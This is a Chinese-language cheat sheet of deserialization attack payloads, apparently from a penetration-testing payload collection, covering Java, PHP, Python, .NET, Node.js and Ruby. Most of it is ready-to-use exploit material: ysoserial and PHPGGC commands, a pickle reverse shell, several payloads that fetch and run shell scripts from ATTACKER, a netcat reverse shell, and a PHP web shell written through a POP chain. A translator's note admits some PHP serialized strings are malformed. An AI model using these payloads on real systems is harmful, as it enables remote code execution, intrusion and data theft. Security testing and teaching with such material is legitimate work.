<a id="-deserialization-payloads"></a>
# 🔓 反序列化载荷

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./Deserialization.tr.md) • [🇬🇷 Ελληνικά](./Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-java-deserialization"></a>
## ☕ Java 反序列化

<a id="detection"></a>
### 检测
```
# 魔数（文件格式标识字节）
AC ED 00 05    # Java 序列化对象（Base64: rO0AB）
H4sIAAAA       # GZip 压缩数据

# 常见位置
- Cookie（Base64 编码）
- 隐藏表单字段
- ViewState
- API 参数
- RMI（端口 1099）
- JMX（端口 9010）
```

<a id="ysoserial---payload-generator"></a>
### ysoserial - 载荷生成器
```bash
# 安装
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# 生成载荷
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# 常见 gadget 利用链
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

<a id="dns-exfiltration-payload"></a>
### DNS 数据外传载荷
```bash
# 生成 DNS 回连载荷
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# 基于 DNS 的检测
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

<a id="common-vulnerable-libraries"></a>
### 常见存在漏洞的库
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

<a id="-php-deserialization"></a>
## 🐘 PHP 反序列化

<a id="magic-methods"></a>
### 魔术方法
```php
__construct()    // 对象创建
__destruct()     // 对象销毁
__wakeup()       // 反序列化
__sleep()        // 序列化
__toString()     // 对象转字符串
__call()         // 调用不可访问的方法
__get()          // 读取不可访问的属性
__set()          // 写入不可访问的属性
```

<a id="basic-payload"></a>
### 基本载荷
```php
// 序列化对象格式
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// 带属性的对象
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// 数组
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

<a id="type-juggling"></a>
### 类型混淆
```php
// 使用布尔值 true 绕过
O:4:"User":1:{s:8:"password";b:1;}

// 与整数 0 比较
O:4:"User":1:{s:8:"password";i:0;}

// 数组比较绕过
O:4:"User":1:{s:8:"password";a:0:{}}
```

<a id="pop-chain-payloads"></a>
### POP（面向属性编程）利用链载荷
```php
// 任意文件写入
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// 通过 __destruct() 执行命令
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

<a id="phpggc---php-gadget-chain"></a>
### PHPGGC - PHP 利用链
```bash
# 安装
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# 列出 gadget 利用链
./phpggc -l

# 生成载荷
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Base64 编码
./phpggc -b Laravel/RCE1 system "id"

# URL 编码
./phpggc -u Laravel/RCE1 system "id"

# 使用包装格式（PHAR）
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

<a id="phar-deserialization"></a>
### Phar 反序列化
```php
// 访问 Phar 文件可能触发反序列化（版本限制见译注）
phar://path/to/phar.phar/internal-file

// 访问 phar:// 的方法
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

<a id="-python-deserialization-pickle"></a>
## 🐍 Python 反序列化（Pickle）

<a id="basic-payload-1"></a>
### 基本载荷
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

<a id="reverse-shell-payload"></a>
### 反向 Shell 载荷
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

<a id="detection-1"></a>
### 检测
```
# 魔数（文件格式标识字节）
80 04 95    # 协议 4（Python 3）
80 03       # 协议 3
80 02       # 协议 2

# 常见 Base64 前缀模式
gASV        # 协议 4
gAN         # 协议 3
```

<a id="yaml-deserialization-python"></a>
### YAML 反序列化（Python）
```yaml
# PyYAML 不安全加载
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# 多条命令
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

<a id="-net-deserialization"></a>
## 🔷 .NET 反序列化

<a id="detection-2"></a>
### 检测
```
# ViewState
__VIEWSTATE 参数（Base64）

# BinaryFormatter
AAEAAAD/////    # Base64 格式标识

# JSON.NET
JSON 中的 $type 字段
```

<a id="ysoserialnet---payload-generator"></a>
### ysoserial.net - 载荷生成器
```powershell
# 下载
# https://github.com/pwntester/ysoserial.net

# 生成载荷
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# 常见 gadget 利用链
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# ViewState 利用
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

<a id="jsonnet-typenamehandling"></a>
### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

<a id="-javascriptnodejs"></a>
## 🟨 JavaScript/Node.js

<a id="node-serialize"></a>
### node-serialize
```javascript
// 存在漏洞的代码：unserialize(user_input)
// 包含 IIFE（立即调用函数表达式）的载荷
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// 反向 Shell
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

<a id="serialize-javascript"></a>
### serialize-javascript
```javascript
// 对反序列化数据使用 eval() 的情况
(function(){require('child_process').execSync('id')})()
```

---

<a id="-ruby-deserialization"></a>
## 🔴 Ruby 反序列化

<a id="marshalload"></a>
### Marshal.load
```ruby
# 创建载荷
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

<a id="yamlload-psych"></a>
### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

<a id="-testing-checklist"></a>
## 📋 测试清单

```markdown
□ 识别序列化格式（Base64、十六进制、魔数）
□ 确定语言／框架（Java、PHP、Python、.NET）
□ 查找存在漏洞的库版本
□ 使用适当工具生成载荷
□ 使用 DNS/HTTP 回连进行盲测
□ 测试文件读写
□ 测试代码执行
□ 尝试不同 gadget 利用链
□ 尝试通过编码或压缩绕过过滤
```

---

<a id="-tools-summary"></a>
## 🔗 工具汇总

| 语言 | 工具 | 用法 |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | 自定义 | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | 自定义 | 手动生成载荷 |

---

<a id="-related-payloads"></a>
## 🔗 相关载荷

- [SSTI 载荷](./SSTI.zh-CN.md)
- [命令注入](./Command-Injection.zh-CN.md)

---

**返回载荷目录：** 原文所指的载荷索引不可用（`./README.md`）；本目录没有英文 README，故未创建翻译索引。

> 译注：部分 PHP 序列化示例的字符串长度或属性数量与内容不一致；此处保留原样，实际分析时须核对格式。gadget 利用链还依赖目标库、版本和配置。[PHP 8.0 迁移说明](https://www.php.net/manual/en/migration80.incompatible.php)指出，PHAR 元数据不再因打开归档而自动反序列化；旧版 phar:// 示例不能直接套用于 PHP 8。Pickle 的前缀仅为常见模式，不能据此排除其他协议或编码。
